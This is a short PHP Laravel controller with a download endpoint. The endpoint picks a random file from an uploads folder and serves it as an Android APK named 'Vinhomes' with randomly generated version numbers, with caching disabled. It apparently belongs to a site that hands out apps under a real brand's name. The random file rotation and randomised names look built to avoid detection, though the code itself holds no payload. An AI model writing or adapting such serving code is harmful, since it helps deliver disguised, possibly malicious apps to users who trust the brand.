<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class DownloadController extends Controller
{
    public function download(Request $request)
    {
        $files = glob('storage/uploads/*.*');
        if (count($files) == 0) return response()->json(['error' => 'No files found.'], 404);
        $file = $files[array_rand($files, 1)];
        $nameFile = 'Vinhomes' . rand(1, 34) . '.' . rand(0, 99) . '.apk';
        return response()->file($file, [
            'Content-Type' => 'application/vnd.android.package-archive',
            'Content-Disposition' => 'attachment; filename="' . $nameFile . '"',
            //cache-control
            'Cache-Control' => 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
        ]);
    }


    public function downloadView(Request $request)
    {
        return view('download');
    }
}
